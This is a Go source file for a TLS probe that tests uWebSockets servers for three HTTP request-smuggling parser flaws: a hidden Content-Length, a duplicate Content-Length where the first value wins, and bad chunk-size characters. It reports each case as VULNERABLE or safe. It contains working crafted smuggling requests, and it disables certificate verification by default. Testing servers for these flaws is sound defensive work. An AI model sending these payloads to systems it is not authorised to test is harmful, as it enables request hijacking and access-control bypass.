// smuggle_probe_tls.go — HTTPS variant of smuggle_probe.go, with TLS diagnostics.
//
// Runs the same A/B/C request-smuggling deviation checks, but over TLS, and it
// PRINTS what it actually negotiated — because the #1 reason a TLS endpoint
// reads "not vulnerable" is that the probe is talking to the wrong layer:
//
//   - A TLS-terminating PROXY (nginx, HAProxy, a cloud LB, Cloudflare, …) that
//     NORMALIZES HTTP will (correctly) reject/normalize the malformed requests →
//     genuinely NOT vulnerable through that front door. That is the compliant-
//     proxy mitigation working, not a probe failure. Probe the BACK-END directly
//     (or a uWS SSLApp) to see the deviation.
//   - If the endpoint negotiates HTTP/2 (ALPN "h2"), an HTTP/1.1 probe cannot
//     express the smuggling framing over h2's binary protocol → false negative.
//     This tool forces ALPN "http/1.1" and WARNS loudly if the server still
//     selects h2.
//   - If uWS itself terminates TLS (uWS::SSLApp), the SAME C++ HttpParser runs,
//     so A/B/C are present exactly as over plaintext (verified against uWS.js).
//
// Detection logic is identical to smuggle_probe.go (raw HTTP/1.1; A/B by counting
// smuggled responses on one keep-alive connection; C by a g/G/z chunk-size
// differential). See tools/README.md.
//
// Usage:
//
//	go run smuggle_probe_tls.go [flags] <https-url | host:port>
//	go run smuggle_probe_tls.go https://127.0.0.1:9443/
//	go run smuggle_probe_tls.go -sni api.example.com -alpn http/1.1 host:443
//
// Flags: -sni <name> (SNI/ServerName), -alpn <csv> (default http/1.1),
//
//	-verify (verify the server cert; default off for self-signed testing),
//	-v (dump raw bytes), -timeout <dur>.
//
// Exit: 0 clean, 1 if any case VULNERABLE, 2 on usage/connection error.
package main

import (
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	sni     = flag.String("sni", "", "TLS SNI / ServerName to send (default: the URL host)")
	alpn    = flag.String("alpn", "http/1.1", "comma-separated ALPN protocols to offer (http/1.1 forces HTTP/1.1)")
	verify  = flag.Bool("verify", false, "verify the server certificate (default off: accept self-signed)")
	verbose = flag.Bool("v", false, "verbose: dump raw requests and responses")
	overall = flag.Duration("timeout", 4*time.Second, "overall read budget per probe")
)

const idle = 600 * time.Millisecond

var (
	hostPort   string   // host:port to dial
	serverName string   // SNI
	alpnProtos []string // offered ALPN
)

func main() {
	flag.Parse()
	if flag.NArg() != 1 {
		fmt.Fprintln(os.Stderr, "usage: smuggle_probe_tls [flags] <https-url | host:port>")
		os.Exit(2)
	}
	arg := flag.Arg(0)

	var host, port, path string
	if strings.Contains(arg, "://") {
		t, err := url.Parse(arg)
		if err != nil || t.Scheme != "https" {
			fmt.Fprintf(os.Stderr, "this tool is HTTPS-only; give an https:// URL or host:port (%v)\n", err)
			os.Exit(2)
		}
		host, port = t.Hostname(), t.Port()
		path = t.EscapedPath()
		if t.RawQuery != "" {
			path += "?" + t.RawQuery
		}
	} else {
		h, p, err := net.SplitHostPort(arg)
		if err != nil { // no port given
			host, port = arg, "443"
		} else {
			host, port = h, p
		}
		path = "/"
	}
	if port == "" {
		port = "443"
	}
	if path == "" {
		path = "/"
	}
	hostPort = net.JoinHostPort(host, port)
	serverName = *sni
	if serverName == "" {
		serverName = host
	}
	for _, p := range strings.Split(*alpn, ",") {
		if p = strings.TrimSpace(p); p != "" {
			alpnProtos = append(alpnProtos, p)
		}
	}
	authority := host
	if port != "443" {
		authority = hostPort
	}

	fmt.Printf("uWebSockets request-smuggling parser-deviation probe (TLS)\n")
	fmt.Printf("target: https://%s%s   (dial %s, SNI %q, ALPN offered %v, verify=%v)\n\n",
		authority, path, hostPort, serverName, alpnProtos, *verify)

	// One diagnostic handshake: show exactly what we negotiated.
	proto, ok := tlsInfo()
	if !ok {
		os.Exit(2)
	}
	if proto == "h2" {
		fmt.Printf("\n⚠  Server negotiated HTTP/2 (ALPN \"h2\"). This probe tests HTTP/1.1 framing and\n")
		fmt.Printf("   CANNOT validate an HTTP/2 endpoint — results below will read as safe even if the\n")
		fmt.Printf("   HTTP/1.1 back-end behind it is vulnerable. Re-run against the plaintext/HTTP-1.1\n")
		fmt.Printf("   back-end directly, or force http/1.1 at the endpoint. (A TLS terminator that only\n")
		fmt.Printf("   speaks h2 to clients but HTTP/1.1 to the back-end also hides the back-end here.)\n\n")
	}
	fmt.Println()

	base := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", path, authority)
	bResp, err := roundTrip([]byte(base + base))
	if err != nil {
		fmt.Fprintf(os.Stderr, "[baseline] cannot reach target: %v\n", err)
		os.Exit(2)
	}
	pipelines := countResponses(bResp) >= 2
	fmt.Printf("[baseline] reachable: %q ; keep-alive/pipelining: %v\n", firstLine(bResp), yn(pipelines))
	if s, u := respHeader(bResp, "server"), respHeader(bResp, "uwebsockets"); s != "" || u != "" {
		fmt.Printf("[identity] Server=%q uWebSockets=%q  (a 'Server: nginx/cloudflare/…' banner ⇒ a proxy/CDN answers; a 'uWebSockets' header ⇒ uWS itself)\n", s, u)
	}
	if !pipelines {
		fmt.Printf("           (server closes per request or is not HTTP/1.1 here — A/B are best-effort)\n")
	}
	fmt.Println()

	a := caseA(authority, path)
	b := caseB(authority, path)
	c := caseC(authority, path)

	fmt.Printf("\nSUMMARY:  A=%s   B=%s   C=%s   (TLS %s)\n", a.verdict, b.verdict, c.verdict, tlsProtoLabel(proto))
	fmt.Printf("NOTE: over TLS, a 'safe' result can mean (1) a compliant TLS-terminating proxy is\n")
	fmt.Printf("      normalizing in front of uWS (genuinely protected), or (2) the endpoint speaks\n")
	fmt.Printf("      HTTP/2 (see warning above). Probe the uWS back-end directly to see the deviation.\n")

	if a.vuln || b.vuln || c.vuln {
		os.Exit(1)
	}
}

func tlsProtoLabel(p string) string {
	if p == "" {
		return "ALPN: none (HTTP/1.1 assumed)"
	}
	return "ALPN: " + p
}

// tlsInfo does one handshake and prints the negotiated TLS parameters.
func tlsInfo() (proto string, ok bool) {
	conn, err := dial()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[tls] handshake failed: %v\n", err)
		return "", false
	}
	defer conn.Close()
	st := conn.ConnectionState()
	fmt.Printf("[tls] version=%s  cipher=%s  alpn=%q\n",
		tls.VersionName(st.Version), tls.CipherSuiteName(st.CipherSuite), st.NegotiatedProtocol)
	if len(st.PeerCertificates) > 0 {
		c := st.PeerCertificates[0]
		fmt.Printf("[tls] peer cert: subject=%q  SAN=%v\n", c.Subject.CommonName, c.DNSNames)
	}
	return st.NegotiatedProtocol, true
}

// --- raw TLS socket plumbing ---

func dial() (*tls.Conn, error) {
	raw, err := net.DialTimeout("tcp", hostPort, 5*time.Second)
	if err != nil {
		return nil, err
	}
	tc := tls.Client(raw, &tls.Config{
		ServerName:         serverName,
		InsecureSkipVerify: !*verify,
		NextProtos:         alpnProtos,
	})
	tc.SetDeadline(time.Now().Add(6 * time.Second))
	if err := tc.Handshake(); err != nil {
		raw.Close()
		return nil, fmt.Errorf("tls handshake: %w", err)
	}
	tc.SetDeadline(time.Time{})
	return tc, nil
}

func roundTrip(payload []byte) ([]byte, error) {
	conn, err := dial()
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	if *verbose {
		fmt.Printf("\n--- SEND ---\n%s\n", string(payload))
	}
	conn.SetWriteDeadline(time.Now().Add(*overall))
	if _, err := conn.Write(payload); err != nil {
		return nil, err
	}
	deadline := time.Now().Add(*overall)
	var buf []byte
	tmp := make([]byte, 1<<16)
	for time.Now().Before(deadline) {
		conn.SetReadDeadline(time.Now().Add(idle))
		n, err := conn.Read(tmp)
		if n > 0 {
			buf = append(buf, tmp[:n]...)
		}
		if err != nil {
			break
		}
	}
	if *verbose {
		fmt.Printf("--- RECV (%d bytes, %d responses) ---\n%s\n", len(buf), countResponses(buf), string(buf))
	}
	return buf, nil
}

// ---- A/B/C (identical logic to smuggle_probe.go) ----

type result struct {
	verdict string
	vuln    bool
}

func report(tag, title, verdict string, vuln bool, evidence string) result {
	dots := strings.Repeat(".", max(3, 46-len(title)))
	fmt.Printf("[%s] %s %s %s\n", tag, title, dots, verdict)
	if evidence != "" {
		fmt.Printf("     evidence: %s\n", evidence)
	}
	return result{verdict, vuln}
}

func caseA(host, path string) result {
	embedded := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", path, host)
	crafted := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\n:\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n%s",
		path, host, len(embedded), embedded)
	canary := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", path, host)
	data, err := roundTrip([]byte(crafted + canary))
	if err != nil {
		return report("A", "empty header name hides Content-Length", "ERROR("+err.Error()+")", false, "")
	}
	n := countResponses(data)
	ev := fmt.Sprintf("crafted single-request framing returned %d responses (first: %q)", n, firstLine(data))
	switch {
	case n >= 3:
		return report("A", "empty header name hides Content-Length", "VULNERABLE", true,
			ev+" — the ':' line hid Content-Length, so the trailing request was parsed separately")
	case n == 2:
		return report("A", "empty header name hides Content-Length", "safe", false,
			ev+" — Content-Length was honored (trailing bytes absorbed as body)")
	default:
		return report("A", "empty header name hides Content-Length", "safe/rejected", false,
			ev+" — request rejected, connection closed, or not HTTP/1.1 (see TLS note)")
	}
}

func caseB(host, path string) result {
	embedded := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", path, host)
	crafted := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n%s",
		path, host, len(embedded), embedded)
	canary := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", path, host)
	data, err := roundTrip([]byte(crafted + canary))
	if err != nil {
		return report("B", "duplicate Content-Length, first wins", "ERROR("+err.Error()+")", false, "")
	}
	n := countResponses(data)
	ev := fmt.Sprintf("duplicate CL (0 then %d) returned %d responses (first: %q)", len(embedded), n, firstLine(data))
	switch {
	case n >= 3:
		return report("B", "duplicate Content-Length, first wins", "VULNERABLE", true,
			ev+" — server used the FIRST Content-Length (0) and smuggled the trailing request (uWS behavior)")
	case n == 2:
		return report("B", "duplicate Content-Length, first wins", "accepts-dup(last-wins)", false,
			ev+" — accepts duplicate CL but used the LAST value (RFC-violating, but not uWS's first-wins)")
	default:
		return report("B", "duplicate Content-Length, first wins", "safe/rejected", false,
			ev+" — request rejected, connection closed, or not HTTP/1.1 (see TLS note)")
	}
}

func caseC(host, path string) result {
	body := "0123456789abcdef" // 16 bytes
	probe := func(size string) int {
		req := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n%s\r\n%s\r\n0\r\n\r\n",
			path, host, size, body)
		data, err := roundTrip([]byte(req))
		if err != nil {
			return -1
		}
		return statusOf(data)
	}
	valid, g, G, z := probe("10"), probe("g"), probe("G"), probe("z")
	ev := fmt.Sprintf("'10'->%s, 'g'->%s, 'G'->%s, 'z'->%s", sc(valid), sc(g), sc(G), sc(z))
	// A chunk-size PARSE rejection is a 400; any other real status (200, 404, 405, …) means the
	// chunk framing was accepted and the request reached routing. Compare 'g'/'G' to the valid '10'
	// control (routed) vs the invalid 'z' control (400) — robust even when the path returns 404.
	routed := func(s int) bool { return s >= 200 && s < 600 && s != 400 }
	switch {
	case !routed(valid):
		return report("C", "chunk-size accepts 'g'/'G' as 16 (F1)", "inconclusive", false,
			ev+" — valid chunked ('10') not parsed/routed (got 400/none); can't test chunked here (or not HTTP/1.1)")
	case z != 400:
		return report("C", "chunk-size accepts 'g'/'G' as 16 (F1)", "inconclusive", false,
			ev+" — control 'z' not rejected with 400; server does not validate chunk sizes (can't isolate 'g')")
	case routed(g) || routed(G):
		return report("C", "chunk-size accepts 'g'/'G' as 16 (F1)", "VULNERABLE", true,
			ev+" — 'g'/'G' parsed/routed like the valid '10' while 'z' is rejected(400): the off-by-one is live")
	default:
		return report("C", "chunk-size accepts 'g'/'G' as 16 (F1)", "safe/hardened", false,
			ev+" — 'g'/'G' rejected(400) like 'z' while '10' routed: the chunk-size parser is strict")
	}
}

// ---- shared helpers (identical to smuggle_probe.go) ----

func countResponses(data []byte) int {
	s := data
	n := 0
	for len(s) > 0 {
		if !bytes.HasPrefix(s, []byte("HTTP/1.")) {
			break
		}
		he := bytes.Index(s, []byte("\r\n\r\n"))
		if he < 0 {
			n++
			break
		}
		head := strings.ToLower(string(s[:he]))
		bodyStart := he + 4
		n++
		if cl := headerValue(head, "content-length"); cl != "" {
			end := bodyStart + atoiSafe(cl)
			if end >= len(s) {
				break
			}
			s = s[end:]
			continue
		}
		if strings.Contains(head, "transfer-encoding:") && strings.Contains(head, "chunked") {
			if term := bytes.Index(s[bodyStart:], []byte("0\r\n\r\n")); term >= 0 {
				s = s[bodyStart+term+5:]
				continue
			}
			break
		}
		break
	}
	return n
}

func headerValue(lowerHead, name string) string {
	for _, line := range strings.Split(lowerHead, "\r\n") {
		if strings.HasPrefix(line, name+":") {
			return strings.TrimSpace(line[len(name)+1:])
		}
	}
	return ""
}

func atoiSafe(s string) int {
	n, err := strconv.Atoi(strings.TrimSpace(s))
	if err != nil || n < 0 {
		return 0
	}
	return n
}

// respHeader returns the value of the named header from the FIRST response block.
func respHeader(data []byte, lowerName string) string {
	he := bytes.Index(data, []byte("\r\n\r\n"))
	if he < 0 {
		he = len(data)
	}
	return headerValue(strings.ToLower(string(data[:he])), lowerName)
}

func firstLine(data []byte) string {
	if i := strings.Index(string(data), "\r\n"); i >= 0 {
		return string(data[:i])
	}
	if len(data) == 0 {
		return "<no response>"
	}
	return string(data)
}

func statusOf(data []byte) int {
	f := strings.Fields(firstLine(data))
	if len(f) < 2 || !strings.HasPrefix(f[0], "HTTP/1.") {
		return -1
	}
	code := 0
	for _, r := range f[1] {
		if r < '0' || r > '9' {
			return -1
		}
		code = code*10 + int(r-'0')
	}
	return code
}

func sc(code int) string {
	if code < 0 {
		return "no-resp"
	}
	return fmt.Sprintf("%d", code)
}
func yn(b bool) string {
	if b {
		return "YES"
	}
	return "no"
}
func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}
